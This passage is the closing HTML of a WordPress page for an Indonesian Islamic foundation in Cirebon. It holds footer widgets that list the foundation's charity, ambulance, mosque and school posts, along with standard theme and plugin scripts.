		<div class="post-meta">
			<span class="date meta-item tie-icon">4 minggu ago</span>		</div>
	</div>
</li>
												</ul>
											</div><!-- .tab-content#recent-posts-tab /-->

										
											<div id="widget_tabs-1-comments" class="tab-content tab-content-comments">
												<ul class="tab-content-elements">
																									</ul>
											</div><!-- .tab-content#comments-tab /-->

										
							</div><!-- .tabs-wrapper-animated /-->
						</div><!-- .tabs-widget /-->
					</div><!-- .widget-container /-->
				</div><!-- .tabs-widget /-->
			</div><!-- .container-wrapper /-->
			<div id="stream-item-widget-1" class="widget stream-item-widget widget-content-only"><div class="stream-item-widget-content"><a href="https://qurban.assunnahcirebon.com" target="_blank" rel="nofollow noopener"><img class="widget-ad-image" src="http://assunnahcirebon.com/wp-content/uploads/2021/08/new-tab-qur.jpg" width="336" height="280" alt=""></a></div></div><div id="stream-item-widget-6" class="widget stream-item-widget widget-content-only"><div class="stream-item-widget-content"><img class="widget-ad-image" src="https://assunnahcirebon.com/wp-content/uploads/2022/10/29.3-scaled.jpg" width="336" height="280" alt=""></div></div>		</div><!-- .theiaStickySidebar /-->
	</aside><!-- .sidebar /-->
	</div><!-- .main-content-row /--></div><!-- #content /-->
<footer id="footer" class="site-footer dark-skin dark-widgetized-area">

	
			<div id="footer-widgets-container">
				<div class="container">
					
		<div class="footer-widget-area ">
			<div class="tie-row">

									<div class="tie-col-sm-6 normal-side">
						<div id="posts-list-widget-10" class="container-wrapper widget posts-list"><div class="widget-title the-global-title"><div class="the-subtitle">Assunnah Peduli</div></div><div class="widget-posts-list-wrapper"><div class="widget-posts-list-container" ><ul class="posts-list-items widget-posts-wrapper">
<li class="widget-single-post-item widget-post-list">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Alhamdulillah Yayasan Assunnah Mempunyai Ambulance" href="https://assunnahcirebon.com/2021/10/10/alhamdulillah-yayasan-assunnah-mempunyai-ambulance/" class="post-thumb"><img width="208" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM.jpeg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM.jpeg 1080w, https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM-300x216.jpeg 300w, https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM-1024x737.jpeg 1024w, https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM-768x553.jpeg 768w" sizes="auto, (max-width: 208px) 100vw, 208px" data-attachment-id="4758" data-permalink="https://assunnahcirebon.com/2021/10/10/alhamdulillah-yayasan-assunnah-mempunyai-ambulance/whatsapp-image-2021-10-12-at-4-15-45-pm/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM.jpeg" data-orig-size="1080,777" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="WhatsApp Image 2021-10-12 at 4.15.45 PM" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM-300x216.jpeg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2021/12/WhatsApp-Image-2021-10-12-at-4.15.45-PM-1024x737.jpeg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2021/10/10/alhamdulillah-yayasan-assunnah-mempunyai-ambulance/">Alhamdulillah Yayasan Assunnah Mempunyai Ambulance</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">10 Oktober 2021</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="AMBULANS GRATIS ANTAR PASIEN" href="https://assunnahcirebon.com/2022/02/19/ambulans-gratis-antar-pasien/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2022/02/274211093_1342605159543697_3036716940815882903_n-220x150.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="5429" data-permalink="https://assunnahcirebon.com/2022/02/19/ambulans-gratis-antar-pasien/274211093_1342605159543697_3036716940815882903_n/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2022/02/274211093_1342605159543697_3036716940815882903_n.jpg" data-orig-size="2048,1536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="274211093_1342605159543697_3036716940815882903_n" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2022/02/274211093_1342605159543697_3036716940815882903_n-300x225.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2022/02/274211093_1342605159543697_3036716940815882903_n-1024x768.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2022/02/19/ambulans-gratis-antar-pasien/">AMBULANS GRATIS ANTAR PASIEN</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">19 Februari 2022</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="AMBULANS MUSLIM INDONESIA" href="https://assunnahcirebon.com/2022/02/21/ambulans-muslim-indonesia/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2022/02/273900111_1343104589493754_6524202225773200207_n-220x150.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="5432" data-permalink="https://assunnahcirebon.com/2022/02/21/ambulans-muslim-indonesia/273900111_1343104589493754_6524202225773200207_n/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2022/02/273900111_1343104589493754_6524202225773200207_n.jpg" data-orig-size="2048,1536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="273900111_1343104589493754_6524202225773200207_n" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2022/02/273900111_1343104589493754_6524202225773200207_n-300x225.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2022/02/273900111_1343104589493754_6524202225773200207_n-1024x768.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2022/02/21/ambulans-muslim-indonesia/">AMBULANS MUSLIM INDONESIA</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">21 Februari 2022</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="ASSUNNAH PEDULI GEMPA CIANJUR" href="https://assunnahcirebon.com/2022/11/23/assunnah-peduli-gempa-cianjur/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2022/11/316411204_1535482703589274_4044177533312666869_n-220x150.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="5650" data-permalink="https://assunnahcirebon.com/2022/11/23/assunnah-peduli-gempa-cianjur/316411204_1535482703589274_4044177533312666869_n/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2022/11/316411204_1535482703589274_4044177533312666869_n.jpg" data-orig-size="1200,1600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="316411204_1535482703589274_4044177533312666869_n" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2022/11/316411204_1535482703589274_4044177533312666869_n-225x300.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2022/11/316411204_1535482703589274_4044177533312666869_n-768x1024.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2022/11/23/assunnah-peduli-gempa-cianjur/">ASSUNNAH PEDULI GEMPA CIANJUR</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">23 November 2022</span>		</div>
	</div>
</li>
</ul></div></div><div class="clearfix"></div></div><!-- .widget /-->					</div><!-- .tie-col /-->
				
									<div class="tie-col-sm-3 normal-side">
						<div id="posts-list-widget-8" class="container-wrapper widget posts-list"><div class="widget-title the-global-title"><div class="the-subtitle">Masjid Jami&#8217; Assunnah</div></div><div class="widget-posts-list-wrapper"><div class="widget-posts-list-container timeline-widget" ><ul class="posts-list-items widget-posts-wrapper">					<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2025/02/04/keceriaan-anak-anak-tkit-assunnah-dalam-ekskul-mewarnai/">
							<span class="date meta-item tie-icon">4 Februari 2025</span>							<h3>Keceriaan Anak-Anak TKIT Assunnah dalam Ekskul Mewarnai</h3>
						</a>
					</li>
										<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2025/02/04/sambut-kunjungan-ponpes-ashabul-quran-payakumbuh/">
							<span class="date meta-item tie-icon">4 Februari 2025</span>							<h3>Sambut Kunjungan Ponpes Ashabul Quran Payakumbuh</h3>
						</a>
					</li>
										<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2024/12/11/class-meeting-setelah-ujian-akhir-semester/">
							<span class="date meta-item tie-icon">11 Desember 2024</span>							<h3>Class Meeting Setelah Ujian Akhir Semester</h3>
						</a>
					</li>
										<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2024/12/02/silaturahmi-anggota-dkm-masjid-binaan-yayasan-assunnah-cirebon/">
							<span class="date meta-item tie-icon">2 Desember 2024</span>							<h3>Silaturahmi Anggota DKM Masjid Binaan Yayasan Assunnah Cirebon</h3>
						</a>
					</li>
										<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2024/11/25/silaturahmi-dan-pertemuan-para-dai-wilayah-3-cirebon-sinergi-untuk-perkembangan-dakwah/">
							<span class="date meta-item tie-icon">25 November 2024</span>							<h3>Silaturahmi dan Pertemuan Para Dai Wilayah 3 Cirebon</h3>
						</a>
					</li>
					</ul></div></div><div class="clearfix"></div></div><!-- .widget /-->					</div><!-- .tie-col /-->
				
									<div class="tie-col-sm-3 normal-side">
						<div id="posts-list-widget-12" class="container-wrapper widget posts-list"><div class="widget-title the-global-title"><div class="the-subtitle">Forum Ummahat</div></div><div class="widget-posts-list-wrapper"><div class="widget-posts-list-container timeline-widget" ><ul class="posts-list-items widget-posts-wrapper">					<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2020/04/12/peduli-covid-19-bersama-forum-silaturahmi-ummahat-yayasan-assunnah-cirebon/">
							<span class="date meta-item tie-icon">12 April 2020</span>							<h3>Peduli Covid-19 Bersama Forum Silaturahmi Ummahat Yayasan Assunnah Cirebon</h3>
						</a>
					</li>
										<li class="widget-single-post-item">
						<a href="https://assunnahcirebon.com/2020/04/04/peduli-kaum-dhuafa-forum-ummahat-yayasan-assunnah-cirebon-bagikan-100-paket-sembako/">
							<span class="date meta-item tie-icon">4 April 2020</span>							<h3>Peduli Kaum Dhuafa, Forum Ummahat Yayasan Assunnah Cirebon Bagikan 100 Paket Sembako</h3>
						</a>
					</li>
					</ul></div></div><div class="clearfix"></div></div><!-- .widget /-->					</div><!-- .tie-col /-->
				
									<div class=" normal-side">
											</div><!-- .tie-col /-->
				
			</div><!-- .tie-row /-->
		</div><!-- .footer-widget-area /-->

						</div><!-- .container /-->
			</div><!-- #Footer-widgets-container /-->
			
			<div id="site-info" class="site-info site-info-layout-2">
				<div class="container">
					<div class="tie-row">
						<div class="tie-col-md-12">

							<div class="copyright-text copyright-text-first">&copy; Copyright 2025, All Rights Reserved &nbsp;|&nbsp; Dibuat dengan&nbsp;<span style="color:red;" class="tie-icon-heart"></span> by Abu Hulya Aulia Zahra</a></div><ul class="social-icons"><li class="social-icons-item"><a class="social-link facebook-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.facebook.com/assunnahcirebonofficial/"><span class="tie-social-icon tie-icon-facebook"></span><span class="screen-reader-text">Facebook</span></a></li><li class="social-icons-item"><a class="social-link twitter-social-icon" rel="external noopener nofollow" target="_blank" href="https://twitter.com/Assunnah_Crb"><span class="tie-social-icon tie-icon-twitter"></span><span class="screen-reader-text">Twitter</span></a></li><li class="social-icons-item"><a class="social-link youtube-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.youtube.com/c/PonpesAssunnahCirebon"><span class="tie-social-icon tie-icon-youtube"></span><span class="screen-reader-text">YouTube</span></a></li><li class="social-icons-item"><a class="social-link instagram-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.instagram.com/assunnahcirebonofficial/"><span class="tie-social-icon tie-icon-instagram"></span><span class="screen-reader-text">Instagram</span></a></li></ul> 

						</div><!-- .tie-col /-->
					</div><!-- .tie-row /-->
				</div><!-- .container /-->
			</div><!-- #site-info /-->
			
</footer><!-- #footer /-->


		<a id="go-to-top" class="go-to-top-button" href="#go-to-tie-body">
			<span class="tie-icon-angle-up"></span>
			<span class="screen-reader-text">Back to top button</span>
		</a>
	
		</div><!-- #tie-wrapper /-->

		
	<aside class=" side-aside normal-side dark-skin dark-widgetized-area is-fullwidth appear-from-left" aria-label="Secondary Sidebar" style="visibility: hidden;">
		<div data-height="100%" class="side-aside-wrapper has-custom-scroll">

			<a href="#" class="close-side-aside remove big-btn light-btn">
				<span class="screen-reader-text">Close</span>
			</a><!-- .close-side-aside /-->


			
				<div id="mobile-container">

											<div id="mobile-search">
							<form role="search" method="get" class="search-form" action="https://assunnahcirebon.com/">
				<label>
					<span class="screen-reader-text">Cari untuk:</span>
					<input type="search" class="search-field" placeholder="Cari &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Cari" />
			</form>						</div><!-- #mobile-search /-->
						
					<div id="mobile-menu" class="hide-menu-icons">
											</div><!-- #mobile-menu /-->

											<div id="mobile-social-icons" class="social-icons-widget solid-social-icons">
							<ul><li class="social-icons-item"><a class="social-link facebook-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.facebook.com/assunnahcirebonofficial/"><span class="tie-social-icon tie-icon-facebook"></span><span class="screen-reader-text">Facebook</span></a></li><li class="social-icons-item"><a class="social-link twitter-social-icon" rel="external noopener nofollow" target="_blank" href="https://twitter.com/Assunnah_Crb"><span class="tie-social-icon tie-icon-twitter"></span><span class="screen-reader-text">Twitter</span></a></li><li class="social-icons-item"><a class="social-link youtube-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.youtube.com/c/PonpesAssunnahCirebon"><span class="tie-social-icon tie-icon-youtube"></span><span class="screen-reader-text">YouTube</span></a></li><li class="social-icons-item"><a class="social-link instagram-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.instagram.com/assunnahcirebonofficial/"><span class="tie-social-icon tie-icon-instagram"></span><span class="screen-reader-text">Instagram</span></a></li></ul> 
						</div><!-- #mobile-social-icons /-->
						
				</div><!-- #mobile-container /-->
			

			
		</div><!-- .side-aside-wrapper /-->
	</aside><!-- .side-aside /-->

	
	</div><!-- #tie-container /-->
</div><!-- .background-overlay /-->

<link rel='preload' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/helpers.min.css' as='style' onload='this.onload=null;this.rel="stylesheet"' />
<noscript><link rel='stylesheet' id='tie-css-helpers-css' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/helpers.min.css' type='text/css' media='all' /></noscript>
<script>console.log('Style tie-css-helpers')</script>
<link rel='preload' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/ilightbox/dark-skin/skin.css' as='style' onload='this.onload=null;this.rel="stylesheet"' />
<noscript><link rel='stylesheet' id='tie-css-ilightbox-css' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/ilightbox/dark-skin/skin.css' type='text/css' media='all' /></noscript>
<script>console.log('Style tie-css-ilightbox')</script>
<link rel='preload' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/fontawesome.css' as='style' onload='this.onload=null;this.rel="stylesheet"' />
<noscript><link rel='stylesheet' id='tie-fontawesome5-css' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/fontawesome.css' type='text/css' media='all' /></noscript>
<script>console.log('Style tie-fontawesome5')</script>
<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/jannah\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<!-- YouTube Feed JS -->
<script type="text/javascript">

</script>
<div id="is-scroller-outer"><div id="is-scroller"></div></div><div id="fb-root"></div>	<div id="tie-popup-search-mobile" class="tie-popup tie-popup-search-wrap" style="display: none;">
		<a href="#" class="tie-btn-close remove big-btn light-btn">
			<span class="screen-reader-text">Close</span>
		</a>
		<div class="popup-search-wrap-inner">
			<div class="live-search-parent pop-up-live-search" data-skin="live-search-popup" aria-label="Search">
				<form method="get" class="tie-popup-search-form" action="https://assunnahcirebon.com/">
					<input class="tie-popup-search-input " inputmode="search" type="text" name="s" title="Search for" autocomplete="off" placeholder="Search for" />
					<button class="tie-popup-search-submit" type="submit">
						<span class="tie-icon-search tie-search-icon" aria-hidden="true"></span>
						<span class="screen-reader-text">Search for</span>
					</button>
				</form>
			</div><!-- .pop-up-live-search /-->
		</div><!-- .popup-search-wrap-inner /-->
	</div><!-- .tie-popup-search-wrap /-->
	<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/arqam/assets/js/scripts.js?ver=6.8.1" id="arqam-scripts-js"></script>
<script type="text/javascript" id="pt-cv-content-views-script-js-extra">
/* <![CDATA[ */
var PT_CV_PUBLIC = {"_prefix":"pt-cv-","page_to_show":"5","_nonce":"05974ca109","is_admin":"","is_mobile":"","ajaxurl":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php","lang":"","loading_image_src":"data:image\/gif;base64,R0lGODlhDwAPALMPAMrKygwMDJOTkz09PZWVla+vr3p6euTk5M7OzuXl5TMzMwAAAJmZmWZmZszMzP\/\/\/yH\/C05FVFNDQVBFMi4wAwEAAAAh+QQFCgAPACwAAAAADwAPAAAEQvDJaZaZOIcV8iQK8VRX4iTYoAwZ4iCYoAjZ4RxejhVNoT+mRGP4cyF4Pp0N98sBGIBMEMOotl6YZ3S61Bmbkm4mAgAh+QQFCgAPACwAAAAADQANAAAENPDJSRSZeA418itN8QiK8BiLITVsFiyBBIoYqnoewAD4xPw9iY4XLGYSjkQR4UAUD45DLwIAIfkEBQoADwAsAAAAAA8ACQAABC\/wyVlamTi3nSdgwFNdhEJgTJoNyoB9ISYoQmdjiZPcj7EYCAeCF1gEDo4Dz2eIAAAh+QQFCgAPACwCAAAADQANAAAEM\/DJBxiYeLKdX3IJZT1FU0iIg2RNKx3OkZVnZ98ToRD4MyiDnkAh6BkNC0MvsAj0kMpHBAAh+QQFCgAPACwGAAAACQAPAAAEMDC59KpFDll73HkAA2wVY5KgiK5b0RRoI6MuzG6EQqCDMlSGheEhUAgqgUUAFRySIgAh+QQFCgAPACwCAAIADQANAAAEM\/DJKZNLND\/kkKaHc3xk+QAMYDKsiaqmZCxGVjSFFCxB1vwy2oOgIDxuucxAMTAJFAJNBAAh+QQFCgAPACwAAAYADwAJAAAEMNAs86q1yaWwwv2Ig0jUZx3OYa4XoRAfwADXoAwfo1+CIjyFRuEho60aSNYlOPxEAAAh+QQFCgAPACwAAAIADQANAAAENPA9s4y8+IUVcqaWJ4qEQozSoAzoIyhCK2NFU2SJk0hNnyEOhKR2AzAAj4Pj4GE4W0bkJQIAOw=="};
var PT_CV_PAGINATION = {"first":"\u00ab","prev":"\u2039","next":"\u203a","last":"\u00bb","goto_first":"Go to first page","goto_prev":"Go to previous page","goto_next":"Go to next page","goto_last":"Go to last page","current_page":"Current page is","goto_page":"Go to page"};
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/content-views-query-and-display-post-page/public/assets/js/cv.js?ver=3.6.1.1" id="pt-cv-content-views-script-js"></script>
<script type="text/javascript" id="toc-front-js-extra">
/* <![CDATA[ */
var tocplus = {"smooth_scroll":"1","visibility_show":"show","visibility_hide":"hide","width":"Auto"};
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/table-of-contents-plus/front.min.js?ver=2309" id="toc-front-js"></script>
<script type="text/javascript" id="dlm-xhr-js-extra">
/* <![CDATA[ */
var dlmXHRtranslations = {"error":"An error occurred while trying to download the file. Please try again.","not_found":"Download does not exist.","no_file_path":"No file path defined.","no_file_paths":"No file paths defined.","filetype":"Download is not allowed for this file type.","file_access_denied":"Access denied to this file.","access_denied":"Access denied. You do not have permission to download this file.","security_error":"Something is wrong with the file path.","file_not_found":"File not found."};
/* ]]> */
</script>
<script type="text/javascript" id="dlm-xhr-js-before">
/* <![CDATA[ */
const dlmXHR = {"xhr_links":{"class":["download-link","download-button"]},"prevent_duplicates":true,"ajaxUrl":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php"}; dlmXHRinstance = {}; const dlmXHRGlobalLinks = "https://assunnahcirebon.com/download/"; const dlmNonXHRGlobalLinks = []; dlmXHRgif = "https://assunnahcirebon.com/wp-includes/images/spinner.gif"; const dlmXHRProgress = "1"
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/download-monitor/assets/js/dlm-xhr.min.js?ver=4.9.3" id="dlm-xhr-js"></script>
<script type="text/javascript" id="tie-scripts-js-extra">
/* <![CDATA[ */
var tie = {"is_rtl":"","ajaxurl":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php","is_taqyeem_active":"","is_sticky_video":"","mobile_menu_top":"","mobile_menu_active":"area_1","mobile_menu_parent":"","lightbox_all":"true","lightbox_gallery":"true","lightbox_skin":"dark","lightbox_thumb":"horizontal","lightbox_arrows":"true","is_singular":"","autoload_posts":"","reading_indicator":"true","lazyload":"","select_share":"true","select_share_twitter":"true","select_share_facebook":"true","select_share_linkedin":"true","select_share_email":"","facebook_app_id":"5303202981","twitter_username":"","responsive_tables":"true","ad_blocker_detector":"https:\/\/assunnahcirebon.com\/wp-content\/themes\/jannah\/assets\/js\/ads.js","sticky_behavior":"upwards","sticky_desktop":"true","sticky_mobile":"true","sticky_mobile_behavior":"default","ajax_loader":"<div class=\"loader-overlay\"><div class=\"spinner-circle\"><\/div><\/div>","type_to_search":"","lang_no_results":"Nothing Found","sticky_share_mobile":"true","sticky_share_post":""};
/* ]]> */
</script>
<script type="text/javascript" defer="defer" src="https://assunnahcirebon.com/wp-content/themes/jannah/assets/js/scripts.min.js?ver=5.4.10" id="tie-scripts-js"></script>
<script type="text/javascript" defer="defer" src="https://assunnahcirebon.com/wp-content/themes/jannah/assets/ilightbox/lightbox.js?ver=5.4.10" id="tie-js-ilightbox-js"></script>
<script type="text/javascript" defer="defer" src="https://assunnahcirebon.com/wp-content/themes/jannah/assets/js/desktop.min.js?ver=5.4.10" id="tie-js-desktop-js"></script>
<script type="text/javascript" id="eael-general-js-extra">
/* <![CDATA[ */
var localize = {"ajaxurl":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php","nonce":"1a3f6dc97b","i18n":{"added":"Added ","compare":"Compare","loading":"Loading..."},"eael_translate_text":{"required_text":"is a required field","invalid_text":"Invalid","billing_text":"Billing","shipping_text":"Shipping","fg_mfp_counter_text":"of"},"page_permalink":"https:\/\/assunnahcirebon.com\/2022\/01\/10\/pelajaran-dan-hikmah-dari-kisah-sahabat-2\/","cart_redirectition":"","cart_page_url":"","el_breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Layar lebar","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}};
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/essential-addons-for-elementor-lite/assets/front-end/js/view/general.min.js?ver=5.9" id="eael-general-js"></script>
<script defer type="text/javascript" src="https://stats.wp.com/e-202522.js" id="jetpack-stats-js"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", {v:'ext',blog:'119314044',post:'0',tz:'7',srv:'assunnahcirebon.com',j:'1:12.8.2'} ]);
_stq.push([ "clickTrackerInit", "119314044", "0" ]);
/* ]]> */
</script>
<script type="text/javascript" defer="defer" src="https://assunnahcirebon.com/wp-content/themes/jannah/assets/js/br-news.js?ver=5.4.10" id="tie-js-breaking-js"></script>
<script>
				WebFontConfig ={
					google:{
						families: [ 'Poppins:600,regular:latin&display=swap' ]
					}
				};

				(function(){
					var wf   = document.createElement('script');
					wf.src   = '//ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
					wf.type  = 'text/javascript';
					wf.defer = 'true';
					var s = document.getElementsByTagName('script')[0];
					s.parentNode.insertBefore(wf, s);
				})();
			</script>				<div class="adsbygoogle Ad-Container sidebar-ad">
					<div style="z-index:-1; height:0; width:1px; visibility: hidden; bottom: -1px; left: 0;"></div>
				</div>

				<div id="tie-popup-adblock" class="tie-popup is-fixed-popup">
					<div class="tie-popup-container">
						<div class="container-wrapper">

							<span class="tie-adblock-icon tie-icon-ban" aria-hidden="true"></span>

							<h2>Adblock Detected</h2>

							<div class="adblock-message">
								Please consider supporting us by disabling your ad blocker							</div>

						</div><!-- .container-wrapper  /-->
					</div><!-- .tie-popup-container /-->
				</div><!-- .tie-popup /-->
			

  
  <style>
      </style>

    <script>     var post_grid_vars = {"siteUrl":"https:\/\/assunnahcirebon.com"}  </script>
  

  <style>
      </style>

  		<script type='text/javascript'>
			!function(t){"use strict";t.loadCSS||(t.loadCSS=function(){});var e=loadCSS.relpreload={};if(e.support=function(){var e;try{e=t.document.createElement("link").relList.supports("preload")}catch(t){e=!1}return function(){return e}}(),e.bindMediaToggle=function(t){var e=t.media||"all";function a(){t.addEventListener?t.removeEventListener("load",a):t.attachEvent&&t.detachEvent("onload",a),t.setAttribute("onload",null),t.media=e}t.addEventListener?t.addEventListener("load",a):t.attachEvent&&t.attachEvent("onload",a),setTimeout(function(){t.rel="stylesheet",t.media="only x"}),setTimeout(a,3e3)},e.poly=function(){if(!e.support())for(var a=t.document.getElementsByTagName("link"),n=0;n<a.length;n++){var o=a[n];"preload"!==o.rel||"style"!==o.getAttribute("as")||o.getAttribute("data-loadcss")||(o.setAttribute("data-loadcss",!0),e.bindMediaToggle(o))}},!e.support()){e.poly();var a=t.setInterval(e.poly,500);t.addEventListener?t.addEventListener("load",function(){e.poly(),t.clearInterval(a)}):t.attachEvent&&t.attachEvent("onload",function(){e.poly(),t.clearInterval(a)})}"undefined"!=typeof exports?exports.loadCSS=loadCSS:t.loadCSS=loadCSS}("undefined"!=typeof global?global:this);
		</script>

		<script type='text/javascript'>
			var c = document.body.className;
			c = c.replace(/tie-no-js/, 'tie-js');
			document.body.className = c;
		</script>
		
</body>
}
<?php
}
?>
